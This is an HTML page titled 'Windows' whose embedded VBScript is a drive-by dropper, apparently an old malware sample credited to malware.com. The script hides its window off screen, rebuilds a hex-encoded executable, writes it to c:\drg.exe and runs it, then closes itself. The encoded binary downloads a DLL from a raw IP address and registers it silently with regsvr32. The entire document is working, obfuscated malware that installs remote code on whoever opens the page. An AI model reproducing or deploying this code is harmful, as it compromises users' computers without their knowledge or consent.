
<title>Windows</title>
<script language=vbs>

On Error Resume Next

self.MoveTo 5000,5000

' 21.08.03 http//www.malware.com
' ;-) dzzie

dim v(8)
cut=""

v(0)="4d,5a,90,y,03,y3,04,y3,z2,y2,b8,y7,40,y35,b0,y3"
v(1)=",0e,1f,ba,0e,y,b4,09,cd,21,b8,01,4c,cd,21,54,68,69,73,20,70,72,6f,67,72,61,6d,20,63,61,6e2,6f,74,20,62,65,20,72,75,6e,20,69,6e,20,44,4f,53,20,6d,6f,64,65,2e,0d2,0a,24,y7"
v(2)=",5d,cf,9f,87,19,ae,f1,d4,19,ae,f1,d4,19,ae,f1,d4,97,b1,e2,d4,13,ae,f1,d4,e5,8e,e3,d4,18,ae,f1,d4,52,69,63,68,19,ae,f1,d4,y8,50,45,y2,4c,01,02,y,bc,16,4f,3f,y8,e0,y,0f,01,0b,01,05,0c,y,02,y3,02,y7,10,y3,10,y3,20,y4,40,y2,10,y3,02,y2,04,y7,04,y8,30,y3,02,y6,02,y5,10,y2,10,y4,10,y2,10,y6,10,y11,18,20,y2,50,y84,20,y2,18,y27,2e,74,65,78,74,y3,b8,y4,10,y3,02,y3,02,y14,20,y2,60,2e,72,64,61,74,61,y2,da,y4,20,y3,02,y3,04,y14,40,y2,40,y8"
v(3)=",eb,6b,72,65,67,73,76,72,33,32,y,63,3a,5c,50,72,6f,67,72,61,6d,20,46,69,6c,65,73,5c,77,69,6e,33,32,2e,64,6c2,y,68,742,70,3a,2f2,36,33,2e,32,34,36,2e,31,33,35,2e,32,33,38,2f,73,75,72,66"
v(4)=",65,72,62,61,72,2e,64,6c2,y,63,3a,5c,50,72,6f,67,72,61,6d,20,46,69,6c,65,73,y,6f,70,65,6e,y,2f,73,20,77,69,6e,33,32,2e,64,6c2,y,6a,y,6a,y,68,0b,10,40,y,68,26,10,40,y,6a,y,e8,24,y3,6a,y,68,4a,10,40,y,68,60,10,40,y,68,02,10,40,y,68,5b,10,40,y,6a,y,e8,13,y3,6a,y,e8,06,y3,z,25,10,20,40,y,z,25,y,20,40,y,z,25,08,20,40,y329"
v(5)=",a2,20,y6,be,20,y6,80,20,y6,78,20,y10,96,20,y2,10,20,y2,68,20,y10,b0,20,y3,20,y2"
v(6)=",70,20,y10,ce,20,y2,08,20,y22,a2,20,y6,be,20,y6,80,20,y6"
v(7)=",31,y,55,52,4c,44,6f,77,6e,6c,6f,61,64,54,6f,46,69,6c,65,41,y2,75,72,6c,6d,6f,6e,2e,64,6c2,y2,80,y,45,78,69,74,50,72,6f,63,65,732,y,6b,65,72,6e,65,6c,33,32,2e,64,6c2,y2,67,y"
v(8)=",53,68,65,6c2,45,78,65,63,75,74,65,41,y,73,68,65,6c2,33,32,2e,64,6c2,y295"

function res(x,y)
        For k = 0 To UBound(v)
                v(k) = Replace(v(k), x, y)
        Next
End Function

res "z", "FF"
res "y", "00"
piece = Split(cut, "/")
cc = 103

For n = 0 To UBound(piece) - 1
        res Chr(cc), piece(n)
        cc = cc + 1
Next

For m = 0 To UBound(v)
        it = it & v(m)
Next


tmp = Split(it, ",")
Set fso = CreateObject("Scripting.FileSystemObject")
pth = "c:\drg.exe"
if not fso.FileExists(pth) then
Set f = eval("fso.Create"+"TextFile(pth, ForWriting)")
For i = 0 To UBound(tmp)
        l = Len(tmp(i))
        b = Int("&H" & Left(tmp(i), 2))
        If l > 2 Then
                r = Int(Mid(tmp(i), 3, l))
                For j = 1 To r
                f.Write Chr(b)
                Next
        Else
                f.Write Chr(b)
        End If
Next
f.Close
Set shell=CreateObject("WScript.Shell")
shell.run(pth)
end if

Self.close
setTimeout "Self.close",1000
</script>
